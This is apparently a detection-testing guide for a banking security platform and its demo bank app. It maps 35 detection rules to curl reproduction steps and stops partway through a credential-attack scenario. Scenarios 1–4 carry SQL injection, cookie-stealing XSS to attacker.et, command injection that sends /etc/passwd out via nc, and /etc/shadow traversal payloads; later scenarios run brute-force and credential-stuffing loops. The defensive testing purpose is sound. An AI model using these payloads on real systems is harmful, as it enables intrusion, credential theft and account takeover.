# Ethio-Cyber-Shield (ECS) v3.0 & HonorPay Digital Banking — Official Regulatory Security Assessment & Attack Simulation Guide

> **Document Type**: Critical National Infrastructure Regulatory Cybersecurity Verification Dossier  
> **Institutional Submission**: Official Verification Report submitted to the **Information Network Security Administration (INSA)**, Directorate of Critical Infrastructure Protection & National Financial Cyber Defense  
> **Project Research Consortium**:
> 1. **Musab Hassen Aliyi** (`CTC-384-26`) — Lead System Architect & Project Coordinator
> 2. **Osman Mohammed Seid** (`CTC-2974-26`) — Lead Detection Engine & Threat Intelligence Engineer
> 3. **Kedist Eyasu Embaye** (`CTC-1247-26`) — Security Telemetry & Cryptographic Verification Engineer
> 4. **Yoseph Abebe Ersedo** (`CTC-430-26`) — SOC Operations & Frontend Visualization Engineer
> 5. **Omer Mohammed Seid** (`CTC-3716-26`) — Core Backend & Multi-Tenancy Systems Engineer
> 6. **Efrem Mola Genebo** (`CTC-4772-26`) — Red Team Operations & Attack Simulation Engineer  
> **Official Monorepo**: [https://github.com/Rammiso/ethio-cybershield](https://github.com/Rammiso/ethio-cybershield)  
> **Regulatory Reference Standards**:
> - **FDRE Proclamation No. 1426/2026** — *Critical Infrastructure Cybersecurity Proclamation* (Mandatory 48-Hour Incident Dossier Reporting & Continuous Threat Monitoring)
> - **National Bank of Ethiopia (NBE) Financial Cybersecurity Framework & Directive SBB/84/2022** — *Real-Time Transaction Fraud, Account Takeover (ATO) & AML Structuring Controls*
> - **FDRE Proclamation No. 1321/2024** — *Personal Data Protection Proclamation (PDPP)* (Zero-PII Compliance & SHA-256 Pseudonymization)
>
> **Evaluated Target System**: HonorPay Digital Banking Platform (`honorpay-banking.vercel.app` / `http://127.0.0.1:8080`)  
> **Evaluated Defense Engine**: Ethio-Cyber-Shield (ECS) Real-Time SOC Detection & Autonomous Containment Platform (`ethio-cyber-shield.onrender.com` / `http://127.0.0.1:5000`, UI: `http://127.0.0.1:5500`)  
> **Total Verified Threat Scenarios**: **32 Comprehensive Detection Rules (100% Coverage of L1-L4 Detection Hierarchy)**

---

## Executive Summary & INSA Compliance Alignment

Ethio-Cyber-Shield (ECS) v3.0 is a specialized, sovereign, high-throughput Security Operations Center (SOC) detection, threat-intelligence correlation, and autonomous response engine built specifically for Ethiopian banking institutions and national critical infrastructure.

Under **INSA Proclamation No. 1426/2026** and **NBE Directives**, financial operators are legally required to maintain:
1. **Continuous Multi-Tier Detection**: Automated detection covering Web API threats, credential abuse, banking fraud, insider sabotage, and threat intelligence.
2. **Zero-PII Sovereign Privacy**: Complete hashing (`SHA-256`) and masking of Mobile Station International Subscriber Directory Numbers (MSISDN / phone numbers), National IDs, and account numbers prior to persistent logging or SOC display.
3. **Closed-Loop Autonomous Containment**: Deterministic, bidirectional containment actions (instant account lockout, session token revocation, IP perimeter drops, and high-value transfer freezes) executed without human latency.
4. **48-Hour Regulatory Readiness**: One-click generation of forensically complete, hash-sealed INSA incident dossiers detailing root cause, microsecond timeline, actor telemetry, and impact analysis.
5. **Cryptographic Tamper-Evidence**: Immutable SHA-256 Merkle hash chains ensuring forensic audit non-repudiation.

This testing guide provides **comprehensive, reproducible verification procedures** for all **32 detection rules** deployed in the platform, using both the live cloud deployments and local standalone sandboxes.

---

## Table of Contents

1. [Live Production Deployment & Lab Architecture](#1-live-production-deployment--lab-architecture)
2. [Burp Suite & Offensive Interception Configuration](#2-burp-suite--offensive-interception-configuration)
3. [Master Attack Scenario & Rule Matrix (All 32 Rules)](#3-master-attack-scenario--rule-matrix)
4. [Step-by-Step Attack Scenarios & Reproduction Procedures](#4-step-by-step-attack-scenarios)
   - [Category A: Web Application Parameter Injection (API-007)](#category-a-web-application-parameter-injection)
   - [Category B: API Security, Token & Session Integrity (API-001 to API-006)](#category-b-api-security-token--session-integrity)
   - [Category C: Authentication, Brute-Force & Credential Abuse (AUTH-001 to AUTH-006)](#category-c-authentication-brute-force--credential-abuse)
   - [Category D: Transaction Anomalies & Payment Security (TX-001, TX-003, TX-004)](#category-d-transaction-anomalies--payment-security)
   - [Category E: Financial Fraud & Anti-Money Laundering (FRAUD-001 to FRAUD-008)](#category-e-financial-fraud--anti-money-laundering-aml)
   - [Category F: Multi-Stage Account Takeover (ATO) Correlation (ATO-001)](#category-f-multi-stage-account-takeover-ato-correlation)
   - [Category G: Insider Threat & Privileged Access Abuse (PRIV-001, ADMIN-001 to ADMIN-005)](#category-g-insider-threat--privileged-access-abuse)
   - [Category H: Threat Intelligence & Watchlist IOCs (IOC-001)](#category-h-threat-intelligence--watchlist-iocs)
5. [Automated Red-Team Batch Simulation Harnesses](#5-automated-red-team-batch-simulation-harnesses)
6. [INSA 48-Hour Dossier Generation & Cryptographic Verification](#6-insa-48-hour-dossier-generation--cryptographic-verification)
7. [Regulatory Sign-Off & Verification Attestation](#7-regulatory-sign-off--verification-attestation)

---

## 1. Live Production Deployment & Lab Architecture

Both the target banking platform (**HonorPay**) and the central detection engine (**Ethio-Cyber-Shield**) are actively deployed in production cloud environments and configured for bidirectional encrypted telemetry and mitigation dispatch.

### 1.1 Live Production Cloud Endpoints

| System / Subsystem | Hosting Platform | Live Production URL | Description & Access Scope |
|---|---|---|---|
| **HonorPay Digital Banking** | **Vercel Cloud** | `https://honorpay-banking.vercel.app` | Connected Ethiopian digital banking application |
| • Customer Login Portal | Vercel Edge | `https://honorpay-banking.vercel.app/login` | Retail banking sign-in with biometric mock & phone auth |
| • Customer Mobile App | Vercel Edge | `https://honorpay-banking.vercel.app/app` | Balance check, fund transfer, beneficiary management |
| • Branch Teller Portal | Vercel Edge | `https://honorpay-banking.vercel.app/employee` | Over-the-counter cash-in deposit & customer service |
| • Security Posture & Admin | Vercel Edge | `https://honorpay-banking.vercel.app/admin` | Security posture monitor, IP blocklist, active sessions |
| • Outbox Event Stream | Vercel Edge | `https://honorpay-banking.vercel.app/admin/events` | Real-time HMAC-signed telemetry queue inspection |
| • Red Team Attack Lab | Vercel Edge | `https://honorpay-banking.vercel.app/admin/lab` | Interactive 1-click browser attack simulator |
| • Automated Self-Test | Vercel Edge | `https://honorpay-banking.vercel.app/admin/selftest` | Automated 12-point pipeline health test |
| **Ethio-Cyber-Shield (ECS)** | **Render Cloud** | `https://ethio-cyber-shield.onrender.com` | Central SOC Detection & Containment Platform |
| • Overview Dashboard | Render Linux | `https://ethio-cyber-shield.onrender.com/dashboard.html` | Real-time posture, KPI cards, high-velocity attack ticker |
| • Live Alert Triage | Render Linux | `https://ethio-cyber-shield.onrender.com/alerts.html` | Real-time alert stream, audio cues, explainable dossiers |
| • Entity & Attack Correlation | Render Linux | `https://ethio-cyber-shield.onrender.com/analysis.html` | Multi-dimensional correlation graph: IP clustering, device hardware MAC pivots, and Ethiopian regional hotspots |
| • Incident Management | Render Linux | `https://ethio-cyber-shield.onrender.com/incidents.html` | Formal incident lifecycle & **48-hr INSA Dossier Exporter** |
| • Threat Intelligence | Render Linux | `https://ethio-cyber-shield.onrender.com/intelligence.html` | Community IOC feed & malicious IP / Tor exit database |
| • Tamper-Evident Audit | Render Linux | `https://ethio-cyber-shield.onrender.com/audit.html` | Cryptographic SHA-256 Merkle hash chain audit ledger |
| • Rules & Mitigations | Render Linux | `https://ethio-cyber-shield.onrender.com/settings.html` | Declarative L1-L4 YAML rule editor & response policies |
| • SaaS Multi-Tenant Console | Render Linux | `https://ethio-cyber-shield.onrender.com/tenants.html` | Multi-tenant organization governance, target provisioning & SDK keys |
| • User Control & IAM | Render Linux | `https://ethio-cyber-shield.onrender.com/users.html` | Cross-tenant user lifecycle, password reset & RBAC governance |
| • Operator Sign-In | Render Linux | `https://ethio-cyber-shield.onrender.com/login.html` | Role-based SOC analyst access with 1-click test chips |
| • System Health Probe | Render Linux | `https://ethio-cyber-shield.onrender.com/api/health` | Live diagnostic probe (PostgreSQL, Redis Streams, rules) |
| • Event Ingest Gateway | Render Linux | `https://ethio-cyber-shield.onrender.com/api/events` | HMAC-SHA256 authenticated event ingestion endpoint |

---

### 1.2 Local Standalone Testbed Endpoints

For offline testing or isolated red-team demonstrations:

| Component | Local Endpoint | Description |
|---|---|---|
| **HonorPay Banking Application** | `http://127.0.0.1:8080` (or `http://localhost:3000`) | Local banking server with SQLite / Supabase mock |
| **ECS Detection & Ingest API** | `http://127.0.0.1:5000` | Local Flask rule evaluation engine & risk scorer |
| **ECS SOC Console Web UI** | `http://127.0.0.1:5500` | Local SOC dashboard & alert triage interface |

---

### 1.3 Pre-Seeded Demonstration & Testing Credentials

| User Identity | Role | System | Email / Phone | Password | Initial State |
|---|---|---|---|---|---|
| **Platform Administrator** | `admin` | HonorPay & ECS | `admin@honorpay.et` / `admin@ethiocybershield.et` | `Testbed#2026` | Fully active |
| **Branch Teller** | `teller` | HonorPay | `teller@honorpay.et` | `Testbed#2026` | Active branch role |
| **SOC Lead Analyst** | `analyst` | ECS SOC | `analyst@ethiocybershield.et` | `Testbed#2026` | Triage authority |
| **Pre-Seeded Customer 1** | `customer` | HonorPay | `0911223344` (or `chaltu@honorpay.et`) | `Testbed#2026` | Password change confirmed |
| **Pre-Seeded Customer 2** | `customer` | HonorPay | `0911556677` (or `abebe@honorpay.et`) | `Testbed#2026` | Regular customer |
| **Pre-Seeded Customer 3** | `customer` | HonorPay | `0922334455` (or `dawit@honorpay.et`) | `Testbed#2026` | Regular customer |
| **Dormant Admin** | `admin` | HonorPay | `dormant_admin@honorpay.et` | `Testbed#2026` | Inactive > 30 days |

---

## 2. Burp Suite & Offensive Interception Configuration

Burp Suite Professional or Community Edition can be used to intercept, inspect, and manipulate HTTP transactions between the client and HonorPay.

```mermaid
flowchart LR
    A[Penetration Tester / Red Team] -->|HTTP Intercept| B[Burp Suite Proxy :8081]
    B -->|Forward Request| C[HonorPay Banking Platform]
    C -->|HMAC-SHA256 Telemetry| D[Ethio-Cyber-Shield ECS]
    D -->|Autonomous Containment| C
    D -->|Real-Time Alert & Dossier| E[INSA / Bank SOC Console]
```

### 2.1 Configuration Steps

1. **Proxy Listener**: In Burp Suite, navigate to `Proxy` → `Proxy settings` → `Proxy listeners` and bind to `127.0.0.1:8081`.
2. **Target Scope**:
   - For Cloud Evaluation: Add `https://honorpay-banking.vercel.app` and `https://ethio-cyber-shield.onrender.com` to Scope.
   - For Local Evaluation: Add `http://127.0.0.1:8080` to Scope.
3. **SSL Certificate Trust**: When testing cloud endpoints via browser, ensure the PortSwigger CA certificate is imported into your browser.
4. **Header Manipulation Guidelines**:
   - `X-Device-Id`: Hardware identifier used for device reputation and untrusted device tracking.
   - `X-Forwarded-For`: Injected source IP used to evaluate rate-limit evasion, IP rotation, and geographic velocity.
   - `Authorization`: `Bearer <jwt>` token used to test IDOR, session hijack, and cross-account privilege escalation.
   - `User-Agent`: Injected scanner strings (`sqlmap`, `Nikto`, `gobuster`) to test bot detection.

---

## 3. Master Attack Scenario & Rule Matrix

Ethio-Cyber-Shield implements a **4-Layer Defense-in-Depth Hierarchy**:
- **Layer 1 (L1) — Statutory & Deterministic Signatures**: Fast pattern matching, regex scans, single-event thresholds (e.g., parameter injection, large transfers, malicious IPs).
- **Layer 2 (L2) — Stateful Temporal & Behavioral Correlations**: Stateful sliding windows evaluating event velocity, rapid state transitions, and rate-limit evasion.
- **Layer 3 (L3) — Complex Multi-Stage Kill Chains**: Cross-event graph correlation tracking multi-step account takeovers and deliberate evasion patterns.
- **Layer 4 (L4) — Unified Entity Risk Aggregator**: Dynamic 0–100 risk scoring with deterministic feature weighting and autonomous containment thresholds.

### Complete 32-Rule Catalog

| # | Rule ID | Threat Scenario Name | Layer | Rule Pack | Severity | Weight | MITRE ATT&CK | Regulatory Mandate | Containment Action |
|---|---|---|:---:|:---:|:---:|:---:|---|---|---|
| **1** | **API-007** | SQL Parameter Injection (SQLi) | L1 | `api` | **HIGH** | 50 | T1190 | INSA Art. 14 / OWASP A03 | Source IP Throttling / Block |
| **2** | **API-007** | Cross-Site Scripting (XSS) | L1 | `api` | **HIGH** | 50 | T1059.007 | INSA Art. 14 / OWASP A03 | Parameter Sanitization Alert |
| **3** | **API-007** | Shell Command Injection | L1 | `api` | **HIGH** | 50 | T1059 | INSA Art. 14 / OWASP A03 | Immediate IP Blacklist |
| **4** | **API-007** | Path / Directory Traversal | L1 | `api` | **HIGH** | 50 | T1083 | INSA Art. 14 / OWASP A01 | Request Block & Log |
| **5** | **API-001** | Authorization Denial Burst | L1 | `web_api` | **MEDIUM** | 25 | T1110 | NBE Cyber Directive §6 | IP Rate-Limit Throttling |
| **6** | **API-002** | Insecure Direct Object Reference (IDOR) | L3 | `web_api` | **HIGH** | 35 | T1190 | INSA Art. 14 / OWASP A01 | Session Invalidation & IP Block |
| **7** | **API-003** | Bearer Token Misuse & Cross-IP Replay | L2 | `web_api` | **HIGH** | 35 | T1539, T1550 | INSA Art. 14 / NBE §7 | Session Kill & Force Re-Auth |
| **8** | **API-004** | Automated Bot & Vulnerability Scanner | L2 | `web_api` | **HIGH** | 30 | T1595 | INSA Art. 14 | Perimeter IP Drop at WAF |
| **9** | **API-005** | Distributed Rate Limit Evasion Probing | L2 | `web_api` | **HIGH** | 35 | T1110.003 | INSA Art. 14 | Subnet (/24) Rate Limiting |
| **10** | **API-006** | Concurrent Session / Session Hijack | L2 | `api` | **HIGH** | 45 | T1539, T1563 | NBE §7 / INSA Art. 14 | Revoke All Sessions & Step-up MFA |
| **11** | **AUTH-001** | Single-Account Login Brute Force Burst | L1 | `web_api` | **MEDIUM** | 25 | T1110.001 | NBE Cyber Directive §5 | Temporary Account Cooldown |
| **12** | **AUTH-002** | Multi-Account Credential Stuffing | L1 | `web_api` | **HIGH** | 35 | T1110.003 | INSA Art. 14 / NBE §5 | Source IP Perimeter Blacklist |
| **13** | **AUTH-003** | New Device Login Following Failures | L2 | `fraud_payments` | **HIGH** | 35 | T1078 | NBE Cyber Directive §7 | Mandatory Device Step-Up Auth |
| **14** | **AUTH-004** | Horizontal Password Spraying Campaign | L2 | `web_api` | **HIGH** | 40 | T1110.003 | INSA Art. 14 | Mandatory CAPTCHA Enforcement |
| **15** | **AUTH-005** | OTP / 2FA Code Brute Force Attack | L2 | `auth` | **HIGH** | 40 | T1110 | NBE Cyber Directive §5 | Invalidate OTP & Lock Challenge |
| **16** | **AUTH-006** | Account Lockout Storm / Denial of Service | L2 | `auth` | **MEDIUM** | 30 | T1110.001 | INSA Art. 16 (Availability) | Block Attacker IP Range |
| **17** | **TX-001** | High-Value Transfer Anomaly (>100k ETB) | L1 | `fraud_payments` | **MEDIUM** | 20 | N/A | NBE Directive SBB/84/2022 | Secondary Approval Hold |
| **18** | **TX-003** | Off-Hours High-Value Transfer | L2 | `fraud_payments` | **HIGH** | 25 | N/A | NBE Payment Risk Directive | Hold for Daytime Triage |
| **19** | **TX-004** | Untrusted / Rogue Hardware Device Transfer | L2 | `fraud_payments` | **HIGH** | 25 | T1078 | NBE Device Binding Rule | Biometric Challenge on Trusted Device |
| **20** | **FRAUD-001** | Rapid Beneficiary Add & Fast Drain | L2 | `fraud_payments` | **HIGH** | 35 | T1565 | NBE Fraud Prevention §8 | Immediate Transfer Freeze |
| **21** | **FRAUD-002** | Mule Syndicate Pass-Through Pattern | L2 | `fraud_payments` | **HIGH** | 35 | T1565 | NBE AML Directive SBB/84 | Account Credit Freeze & AML Audit |
| **22** | **FRAUD-003** | SIM-Swap / Credential Reset Prior to Drain | L2 | `fraud_payments` | **CRITICAL** | 40 | T1451 | Ethio Telecom / NBE Joint Rule | Immediate Transfer Freeze & Voice Call |
| **23** | **FRAUD-004** | Transfer Structuring / Smurfing (<50k ETB) | L2 | `fraud_payments` | **HIGH** | 30 | N/A | NBE 50,000 ETB CTR Limit | Suspicious Transaction Report (STR) |
| **24** | **FRAUD-005** | USSD & Mobile Retail Agent Cash-Out Burst | L2 | `fraud_payments` | **HIGH** | 30 | T1565 | NBE Mobile Money Directive | USSD Session Block & Branch Alert |
| **25** | **FRAUD-006** | Authorized Push Payment (APP) Coached Scam | L3 | `fraud_payments` | **CRITICAL** | 45 | T1566 | NBE Social Engineering Guideline | Mandatory 2-Hour Cooling-Off Hold |
| **26** | **FRAUD-007** | Impossible Geolocation Travel Velocity | L2 | `fraud_payments` | **HIGH** | 35 | T1078 | INSA Proclamation 1426 | Invalidate Session & Force Biometric |
| **27** | **FRAUD-008** | Branch / Agent Cash-In Deposit Structuring | L2 | `fraud` | **HIGH** | 50 | T1565 | NBE Directive SBB/84/2022 | Teller Cash-In Freeze & STR Filing |
| **28** | **ATO-001** | Multi-Stage Account Takeover (ATO) Chain | L3 | `fraud_payments` | **CRITICAL** | 80 | T1078, T1110 | INSA Art. 14 & 18 / NBE §5 | Autonomous Account Lock & Transfer Freeze |
| **29** | **PRIV-001** | Customer Privilege Abuse on Admin Routes | L2 | `insider_admin` | **HIGH** | 40 | T1078.004 | INSA Access Control Mandate | Immediate Session Termination |
| **30** | **ADMIN-001** | Insider Threat: Mass Customer Data Export | L2 | `insider_admin` | **CRITICAL** | 45 | T1567 | PDPP 1321/2024 / INSA Art. 14 | Admin Session Kill & DPO Notification |
| **31** | **ADMIN-002** | Dormant Admin Account Activation | L2 | `insider_admin` | **HIGH** | 35 | T1078.002 | NBE IT Governance Directive | Freeze Administrative Session |
| **32** | **ADMIN-003** | Off-Hours Privileged Configuration Action | L2 | `insider_admin` | **HIGH** | 35 | T1078 | NBE Core Banking Audit Rule | Dual Authorization Lock |
| **33** | **ADMIN-004** | Unauthorized Role Elevation Attempt | L2 | `insider_admin` | **CRITICAL** | 45 | T1078.004 | NBE Governance & Dual Control | Immediate Revocation & Audit Alert |
| **34** | **ADMIN-005** | Cryptographic Audit Trail Tampering Attempt | L3 | `insider_admin` | **CRITICAL** | 50 | T1562.002 | INSA Proclamation 1426 Art. 18 | DB Server Isolation & INSA Alert |
| **35** | **IOC-001** | Malicious Source IP / Tor Exit Node Match | L1 | `web_api` | **HIGH** | 40 | T1071 | INSA National Threat Feed | TCP Perimeter Drop at Ingress |

*(Note: API-007 covers 4 distinct injection vectors: SQLi, XSS, Command Injection, and Path Traversal, totaling 35 distinct verifiable test vectors across the 32 engine rules).*

---

## 4. Step-by-Step Attack Scenarios

Set the target environment variable in your terminal before running the curl commands:

```bash
# Choose Cloud Deployment (Live) OR Localhost (Offline)
export TARGET_URL="https://honorpay-banking.vercel.app"      # Live Cloud
# export TARGET_URL="http://127.0.0.1:8080"                  # Local Standalone

export ECS_URL="https://ethio-cyber-shield.onrender.com"     # Live Cloud ECS
# export ECS_URL="http://127.0.0.1:5000"                     # Local Standalone ECS
```

---

### Category A: Web Application Parameter Injection

#### Scenario 1: SQL Parameter Injection (API-007)
* **Threat Profile**: Adversary attempts database exfiltration via unvalidated input fields in search, transfer, or profile endpoints.
* **Standards Mapping**: MITRE ATT&CK T1190; INSA Proclamation No. 1426/2026 Art. 14; OWASP Top 10 A03:2021.
* **Method 1 — HonorPay UI Reproduction**:
  1. Open `$TARGET_URL/login` and log in as `0911223344` (`Testbed#2026`).
  2. Navigate to **Transfers** (`$TARGET_URL/app`).
  3. In the "Beneficiary Account Number" field, enter:
     `' UNION SELECT user_id, email, password_hash FROM profiles--`
  4. Submit transfer request.
* **Method 2 — Command Line (`curl`)**:
  ```bash
  curl -s -X POST "$TARGET_URL/api/transfers" \
    -H "Content-Type: application/json" \
    -H "X-Device-Id: dev-sqli-test" \
    -d '{
      "beneficiary_account": "'\'' UNION SELECT id, email, password_hash FROM profiles--",
      "amount": 500
    }' | jq .
  ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `API-007` (Web Application Parameter Injection)
  - **Layer / Pack**: `L1` / `api` | **Severity**: `HIGH` | **Weight**: `50`
  - **Evidence Pattern**: `pattern_class: SQLI`, `field: beneficiary_account`.
  - **Autonomous Containment**: Target system rejects malformed input; ECS increments source IP threat score.

---

#### Scenario 2: Cross-Site Scripting (XSS) (API-007)
* **Threat Profile**: Adversary injects JavaScript into the transaction memo field to steal session cookies or auth tokens when viewed by tellers or administrators.
* **Standards Mapping**: MITRE ATT&CK T1059.007; OWASP A03:2021.
* **Method 1 — HonorPay UI Reproduction**:
  1. In the customer transfer form, enter Memo:
     `<script>fetch('https://attacker.et/steal?c='+document.cookie)</script>`
  2. Click "Confirm Transfer".
* **Method 2 — Command Line (`curl`)**:
  ```bash
  curl -s -X POST "$TARGET_URL/api/transfers" \
    -H "Content-Type: application/json" \
    -d '{
      "memo": "<script>alert(document.cookie)</script>",
      "amount": 100
    }' | jq .
  ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `API-007` | **Evidence**: `pattern_class: XSS`.
  - **Containment**: Input sanitized; security alert generated in real-time SOC console.

---

#### Scenario 3: Shell Command Injection (API-007)
* **Threat Profile**: Adversary attempts remote code execution by appending shell metacharacters to backend service parameters.
* **Standards Mapping**: MITRE ATT&CK T1059; INSA Proclamation No. 1426/2026 Art. 14.
* **Method 2 — Command Line (`curl`)**:
  ```bash
  curl -s -X POST "$TARGET_URL/api/transfers" \
    -H "Content-Type: application/json" \
    -d '{
      "beneficiary_name": "Abebe; cat /etc/passwd | nc 196.188.1.1 4444",
      "amount": 250
    }' | jq .
  ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `API-007` | **Evidence**: `pattern_class: COMMAND_INJECTION`.
  - **Containment**: Source IP flagged for immediate firewall blocking.

---

#### Scenario 4: Path / Directory Traversal (API-007)
* **Threat Profile**: Adversary probes document and statement download endpoints with directory climb sequences (`../`).
* **Standards Mapping**: MITRE ATT&CK T1083.
* **Method 2 — Command Line (`curl`)**:
  ```bash
  curl -s "$TARGET_URL/api/documents?file=../../../../etc/shadow" | jq .
  ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `API-007` | **Evidence**: `pattern_class: PATH_TRAVERSAL`.

---

### Category B: API Security, Token & Session Integrity

#### Scenario 5: Authorization Denial Burst (API-001)
* **Threat Profile**: Attacker or broken script repeatedly attempts actions for which they have no permission, generating an abnormal spike of 4+ 401/403 denials in 60s.
* **Standards Mapping**: MITRE ATT&CK T1110; NBE Cyber Security Directive §6.
* **Testing Command (`curl`)**:
  ```bash
  for i in {1..5}; do
    curl -s -X POST "$TARGET_URL/api/admin/users" \
      -H "X-Forwarded-For: 196.188.10.45" \
      -H "Content-Type: application/json" \
      -d '{"action": "probe"}'
    sleep 0.2
  done
  ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `API-001` (Authorization Denial Burst)
  - **Layer / Pack**: `L1` / `web_api` | **Severity**: `MEDIUM` | **Weight**: `25`
  - **Threshold**: `denial_count: 4` within 60s from `196.188.10.45`.
  - **Containment**: Source IP throttled at API gateway.

---

#### Scenario 6: Insecure Direct Object Reference (IDOR) Enumeration (API-002)
* **Threat Profile**: Authenticated customer systematically increments numerical transaction or account IDs to scrape sensitive records belonging to other Ethiopian banking customers.
* **Standards Mapping**: MITRE ATT&CK T1190; INSA Proclamation No. 1426/2026 Art. 14; PDPP No. 1321/2024.
* **Testing Command (`curl`)**:
  ```bash
  # Customer queries sequential transaction IDs
  for id in {1001..1006}; do
    curl -s "$TARGET_URL/api/transactions/$id" \
      -H "X-Device-Id: dev-idor-probe" \
      -H "X-Target-Session: sess-customer-01"
    sleep 0.2
  done
  ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `API-002` (Sequential Resource Enumeration Probing)
  - **Layer / Pack**: `L3` / `web_api` | **Severity**: `HIGH` | **Weight**: `35`
  - **Evidence**: Sequential ID distance = 1 across multiple consecutive API calls.
  - **Containment**: Offending session invalidated; IP placed on temporary blocklist.

---

#### Scenario 7: Bearer Token Misuse & Cross-IP Replay (API-003)
* **Threat Profile**: Stolen bearer JWT or session cookie intercepted via Wi-Fi eavesdropping or malware and simultaneously used from two completely different IP addresses.
* **Standards Mapping**: MITRE ATT&CK T1539, T1550.001; NBE Cyber Security Directive §7.
* **Testing Command (`curl`)**:
  ```bash
  # Request 1: From legitimate customer IP in Addis Ababa
  curl -s "$TARGET_URL/api/account" \
    -H "Authorization: Bearer mock-jwt-token-chaltu" \
    -H "X-Forwarded-For: 196.188.12.55"

  # Request 2: Simultaneous replay from foreign IP (e.g., Nigeria or Europe)
  curl -s "$TARGET_URL/api/account" \
    -H "Authorization: Bearer mock-jwt-token-chaltu" \
    -H "X-Forwarded-For: 102.164.55.20"
  ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `API-003` (Bearer Token Misuse and Replay)
  - **Layer / Pack**: `L2` / `web_api` | **Severity**: `HIGH` | **Weight**: `35`
  - **Threshold**: Token observed across 2+ distinct IPs concurrently.
  - **Containment**: Autonomous session kill; customer prompted for step-up SMS OTP re-auth.

---

#### Scenario 8: Automated Bot & Vulnerability Scanner Fingerprints (API-004)
* **Threat Profile**: Adversary performs automated reconnaissance against Ethiopian banking infrastructure using scanning tools like `sqlmap`, `Nikto`, `gobuster`, or `BurpSuite`.
* **Standards Mapping**: MITRE ATT&CK T1595; INSA Proclamation No. 1426/2026 Art. 14.
* **Testing Command (`curl`)**:
  ```bash
  curl -s "$TARGET_URL/api/transfers" \
    -H "User-Agent: sqlmap/1.8.4#stable (https://sqlmap.org)" \
    -H "X-Forwarded-For: 197.156.70.1"
  ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `API-004` (Automated Bot and Security Tool Scanning)
  - **Layer / Pack**: `L2` / `web_api` | **Severity**: `HIGH` | **Weight**: `30`
  - **Evidence**: Matched scanner signature `sqlmap`.
  - **Containment**: Ingress WAF drops TCP connection; IP reported to national threat feed.

---

#### Scenario 9: Distributed Rate Limit Evasion Probing (API-005)
* **Threat Profile**: Threat actor cycles across consecutive IP addresses within a `/24` subnet block to evade single-IP rate-limiting thresholds.
* **Standards Mapping**: MITRE ATT&CK T1110.003; INSA Proclamation No. 1426/2026 Art. 14.
* **Testing Command (`curl`)**:
  ```bash
  for i in {1..12}; do
    curl -s "$TARGET_URL/api/transfers" \
      -H "X-Forwarded-For: 196.188.50.$i" \
      -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    sleep 0.1
  done
  ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `API-005` (Distributed Rate Limit Evasion Probing)
  - **Layer / Pack**: `L2` / `web_api` | **Severity**: `HIGH` | **Weight**: `35`
  - **Evidence**: 10+ requests from `196.188.50.0/24` within 60s.
  - **Containment**: Subnet-level throttling enforced.

---

#### Scenario 10: Concurrent Session / Session Hijack Anomaly (API-006)
* **Threat Profile**: Legitimate customer logs out, but an attacker holding a compromised session token immediately attempts financial transactions.
* **Standards Mapping**: MITRE ATT&CK T1539, T1563; NBE Cyber Security Directive §7.
* **Testing Flow**:
  1. Intercept valid session ID `sess-customer-99`.
  2. Target logs out: `POST $TARGET_URL/api/auth/logout`.
  3. Attacker replays session from a new IP: `GET $TARGET_URL/api/account`.
* **Telemetry & Detection Result**:
  - **Fired Rule**: `API-006` (Concurrent Session / Session Hijack Anomaly)
  - **Layer / Pack**: `L2` / `api` | **Severity**: `HIGH` | **Weight**: `45`
  - **Containment**: Target system revokes session immediately; notification sent to registered phone number.

---

### Category C: Authentication, Brute-Force & Credential Abuse

#### Scenario 11: Single-Account Login Password Brute Force Burst (AUTH-001)
* **Threat Profile**: Attacker attempts rapid password guessing against a high-profile banking customer or executive account.
* **Standards Mapping**: MITRE ATT&CK T1110.001; NBE Cyber Security Directive §5.
* **Method 1 — HonorPay UI Reproduction**:
  1. Open `$TARGET_URL/login`.
  2. Enter account phone: `0911223344`.
  3. Submit 5 different incorrect passwords (`Wrong1`, `Wrong2`, `Wrong3`, `Wrong4`, `Wrong5`) within 30 seconds.
* **Method 2 — Command Line (`curl`)**:
  ```bash
  for i in {1..6}; do
    curl -s -X POST "$TARGET_URL/api/login" \
      -H "Content-Type: application/json" \
      -d '{"email": "chaltu@honorpay.et", "password": "BadPassword'$i'"}'
    sleep 0.3
  done
  ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `AUTH-001` (Login Failure Burst)
  - **Layer / Pack**: `L1` / `web_api` | **Severity**: `MEDIUM` | **Weight**: `25`
  - **Threshold**: 5 consecutive failures targeting single account within 60s.
  - **Containment**: Temporary 5-minute login cooldown imposed on account.

---

#### Scenario 12: Multi-Account Credential Stuffing Campaign (AUTH-002)
* **Threat Profile**: Cyber syndicate fires breached credentials against multiple Ethiopian banking accounts from a single IP address.
* **Standards Mapping**: MITRE ATT&CK T1110.003; INSA Proclamation No. 1426/2026 Art. 14.
* **Testing Command (`curl`)**:
  ```bash
  for user in chaltu@honorpay.et abebe@honorpay.et dawit@honorpay.et fatuma@honorpay.et; do
    curl -s -X POST "$TARGET_URL/api/login" \
      -H "Content-Type: application/json" \
      -H "X-Forwarded-For: 196.188.88.99" \
      -d "{\"email\": \"$user\", \"password\": \"StuffedPass2026\"}"
    sleep 0.4
  done
  ```
* **Telemetry & Detection Result**:
  - **Fired Rule**: `AUTH-002` (Multi-Account Source Burst / Credential Stuffing)
  - **Layer / Pack**: `L1` / `web_api` | **Severity**: `HIGH` | **Weight**: `35`
  - **Threshold**: >= 3 distinct accounts targeted with failed logins from single IP within 60s.
  - **Containment**: Source IP `196.188.88.99` blocked at firewall.

---

#### Scenario 13: New Device Login Following Suspicious Failures (AUTH-003)
* **Threat Profile**: Attacker fails several password attempts, eventually guesses correctly, and authenticates from an unrecognized hardware device.
* **Standards Mapping**: MITRE ATT&CK T1078; NBE Cyber Security Directive §7.
* **Testing Flow**:
  1. Attacker fails 3 logins on target account:
     ```bash
     for i in {1..3}; do
       curl -s -X POST "$TARGET_URL/api/login" \
         -H "Content-Type: application/json" \
         -d '{"email": "chaltu@honorpay.et", "password": "WrongPassword"}'
       sleep 0.3
     done
     ```
  2. Attacker logs in successfully with new hardware fingerprint:
     ```bash
